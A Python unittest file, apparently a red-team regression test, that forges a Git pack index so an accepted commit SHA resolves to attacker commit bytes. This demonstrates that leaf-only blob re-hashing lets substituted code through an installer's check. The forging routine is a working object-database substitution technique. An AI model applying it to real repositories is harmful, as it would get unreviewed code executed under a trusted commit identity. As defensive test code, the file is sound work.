#!/usr/bin/env python3
"""Expected-red witness for accepted commit/tree lookup at Git execution time.

Leaf-blob re-hashing is not sufficient when the blob OID is re-derived later
from the same mutable object database.  A forged pack index can alias the
externally accepted commit OID to different commit bytes after an earlier
acceptance audit; a fresh ``ls-tree <accepted-sha>`` then walks the attacker's
tree and returns an attacker blob OID.  The attacker blob is perfectly
self-consistent with that newly derived OID.
"""
from __future__ import annotations

import hashlib
from pathlib import Path
import re
import struct
import subprocess
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[3]
INSTALLER = ROOT / "scripts/field/install_one_time_capture.command"
GIT = "/usr/bin/git"
TARGET = "Scripts/bootstrap_capture_tuya_sdk.sh"


def git_object_oid(object_type: str, payload: bytes) -> str:
    return hashlib.sha1(
        object_type.encode("ascii")
        + b" "
        + str(len(payload)).encode("ascii")
        + b"\0"
        + payload
    ).hexdigest()


def git_blob_oid(payload: bytes) -> str:
    return git_object_oid("blob", payload)


class CaptureFieldPackedCommitExecutionRedTeamTests(unittest.TestCase):
    def _git(self, repo: Path, *args: str, input_bytes: bytes | None = None) -> bytes:
        return subprocess.check_output(
            [GIT, "-C", str(repo), *args],
            input=input_bytes,
            stderr=subprocess.DEVNULL,
        )

    def _make_repository(self, repo: Path) -> tuple[str, str, bytes, str, bytes]:
        repo.mkdir(parents=True)
        subprocess.run([GIT, "init", "-q", str(repo)], check=True)
        subprocess.run(
            [GIT, "-C", str(repo), "config", "user.email", "nembra@example.invalid"],
            check=True,
        )
        subprocess.run(
            [GIT, "-C", str(repo), "config", "user.name", "Nembra Red Team"],
            check=True,
        )

        target = repo / TARGET
        target.parent.mkdir(parents=True)
        accepted_payload = b"#!/bin/bash\necho accepted-bootstrap\n"
        target.write_bytes(accepted_payload)
        subprocess.run([GIT, "-C", str(repo), "add", TARGET], check=True)
        subprocess.run([GIT, "-C", str(repo), "commit", "-qm", "accepted fixture"], check=True)
        accepted_commit = self._git(repo, "rev-parse", "HEAD").decode("ascii").strip()
        accepted_blob = self._git(repo, "rev-parse", f"HEAD:{TARGET}").decode("ascii").strip()
        self.assertEqual(git_blob_oid(accepted_payload), accepted_blob)
        accepted_commit_payload = self._git(repo, "cat-file", "commit", accepted_commit)
        self.assertEqual(git_object_oid("commit", accepted_commit_payload), accepted_commit)

        attacker_payload = b"#!/bin/bash\necho attacker-executed\n"
        target.write_bytes(attacker_payload)
        subprocess.run([GIT, "-C", str(repo), "add", TARGET], check=True)
        subprocess.run([GIT, "-C", str(repo), "commit", "-qm", "attacker fixture"], check=True)
        attacker_commit = self._git(repo, "rev-parse", "HEAD").decode("ascii").strip()
        attacker_blob = self._git(repo, "rev-parse", f"HEAD:{TARGET}").decode("ascii").strip()
        self.assertEqual(git_blob_oid(attacker_payload), attacker_blob)

        # Return the physical worktree to the externally accepted bytes before
        # the object-database substitution window opens.
        subprocess.run([GIT, "-C", str(repo), "reset", "--hard", "-q", accepted_commit], check=True)
        self.assertEqual(target.read_bytes(), accepted_payload)
        return accepted_commit, accepted_blob, accepted_payload, attacker_commit, attacker_payload

    def _forge_single_object_pack_alias(
        self,
        repo: Path,
        *,
        source_oid: str,
        alias_oid: str,
    ) -> Path:
        pack_prefix = repo / ".git" / "objects" / "pack" / "pack"
        pack_hash = subprocess.check_output(
            [GIT, "-C", str(repo), "pack-objects", str(pack_prefix)],
            input=(source_oid + "\n").encode("ascii"),
        ).decode("ascii").strip()

        # Force both names through the one-object pack.  The attacker object's
        # referenced tree/blob stay genuine loose objects; only commit-name
        # lookup is being aliased here.
        for oid in (source_oid, alias_oid):
            loose = repo / ".git" / "objects" / oid[:2] / oid[2:]
            if loose.exists():
                loose.unlink()

        index = repo / ".git" / "objects" / "pack" / f"pack-{pack_hash}.idx"
        data = bytearray(index.read_bytes())
        self.assertEqual(data[:4], b"\xfftOc")
        self.assertEqual(struct.unpack(">I", data[4:8])[0], 2)

        fanout_offset = 8
        names_offset = fanout_offset + 256 * 4
        count = struct.unpack(
            ">I", data[fanout_offset + 255 * 4 : fanout_offset + 256 * 4]
        )[0]
        self.assertEqual(count, 1, "fixture pack must contain exactly one commit object")

        data[names_offset : names_offset + 20] = bytes.fromhex(alias_oid)
        first_byte = int(alias_oid[:2], 16)
        for index_value in range(256):
            struct.pack_into(
                ">I",
                data,
                fanout_offset + index_value * 4,
                0 if index_value < first_byte else 1,
            )

        # v2 SHA-1 index trailer: pack checksum, then index checksum.
        data[-20:] = hashlib.sha1(data[:-20]).digest()
        index.write_bytes(data)
        return index

    def _late_leaf_only_verifier(self, repo: Path, source_sha: str) -> tuple[str, bytes]:
        """Model the unsafe leaf-only shape currently proposed for #2922."""
        tree = self._git(
            repo,
            "ls-tree",
            "-r",
            "-z",
            source_sha,
            "--",
            ":(literal)" + TARGET,
        )
        records = [record for record in tree.split(b"\0") if record]
        self.assertEqual(len(records), 1)
        metadata, path_raw = records[0].split(b"\t", 1)
        mode, object_type, oid_raw = metadata.split(b" ", 2)
        self.assertEqual(path_raw.decode("utf-8"), TARGET)
        self.assertIn(mode, {b"100644", b"100755"})
        self.assertEqual(object_type, b"blob")
        expected_blob = oid_raw.decode("ascii")

        payload = self._git(repo, "cat-file", "blob", expected_blob)
        self.assertEqual(git_blob_oid(payload), expected_blob)
        return expected_blob, payload

    def test_commit_pack_alias_retargets_fresh_tree_lookup_after_accepted_audit(self) -> None:
        with tempfile.TemporaryDirectory(prefix="nembra-packed-commit-redteam-") as directory:
            repo = Path(directory) / "repo"
            (
                accepted_commit,
                accepted_blob,
                accepted_payload,
                attacker_commit,
                attacker_payload,
            ) = self._make_repository(repo)

            # This is the trustworthy earlier acceptance state: externally named
            # commit bytes, its tree result, and physical source all agree.
            genuine_commit_payload = self._git(repo, "cat-file", "commit", accepted_commit)
            self.assertEqual(git_object_oid("commit", genuine_commit_payload), accepted_commit)
            before_tree = self._git(repo, "ls-tree", "-r", accepted_commit).decode("utf-8")
            self.assertIn(f"blob {accepted_blob}\t{TARGET}", before_tree)
            self.assertEqual((repo / TARGET).read_bytes(), accepted_payload)

            forged_index = self._forge_single_object_pack_alias(
                repo,
                source_oid=attacker_commit,
                alias_oid=accepted_commit,
            )

            # The externally accepted SHA string has not changed, and the
            # physical worktree still has the accepted bytes.  But ordinary
            # object-name lookup now returns the attacker commit payload for the
            # accepted commit identity.
            substituted_commit_payload = self._git(repo, "cat-file", "commit", accepted_commit)
            self.assertEqual(git_object_oid("commit", substituted_commit_payload), attacker_commit)
            self.assertNotEqual(git_object_oid("commit", substituted_commit_payload), accepted_commit)
            self.assertEqual((repo / TARGET).read_bytes(), accepted_payload)

            # A fresh ls-tree therefore derives the attacker blob OID.  Re-hash
            # of only that leaf blob succeeds and would authorize attacker bytes.
            derived_blob, verified_payload = self._late_leaf_only_verifier(repo, accepted_commit)
            self.assertNotEqual(derived_blob, accepted_blob)
            self.assertEqual(verified_payload, attacker_payload)

            verify = subprocess.run(
                [GIT, "verify-pack", "-v", str(forged_index)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )
            self.assertNotEqual(
                verify.returncode,
                0,
                "fixture must remain detectably invalid under full pack verification",
            )

    def test_installer_execution_reader_must_bind_path_resolution_to_externally_accepted_commit(self) -> None:
        source = INSTALLER.read_text(encoding="utf-8")

        # #2922 already requires returned leaf bytes to be re-hashed.  This
        # successor contract requires the path-to-leaf authority itself to be
        # mechanically rooted in the externally accepted commit bytes rather
        # than a fresh unverified `ls-tree <SOURCE_SHA>` lookup.
        self.assertIn(
            "read_verified_accepted_source()",
            source,
            "field installer still lacks one verified accepted-source execution boundary",
        )
        self.assertRegex(
            source,
            re.compile(
                r"accepted source commit[^\n]*(?:payload|object|identity)[^\n]*(?:match|accepted|SHA)",
                re.IGNORECASE,
            ),
            "accepted-source execution does not visibly fail closed when returned commit bytes disagree with the externally accepted SOURCE_SHA",
        )
        self.assertRegex(
            source,
            re.compile(r"(?:commit\s|\"commit\")[^\n]{0,160}(?:sha1|hashlib|hash-object)", re.IGNORECASE),
            "accepted-source execution does not independently re-hash the exact commit payload used to resolve the executable path",
        )


if __name__ == "__main__":
    unittest.main(verbosity=2)
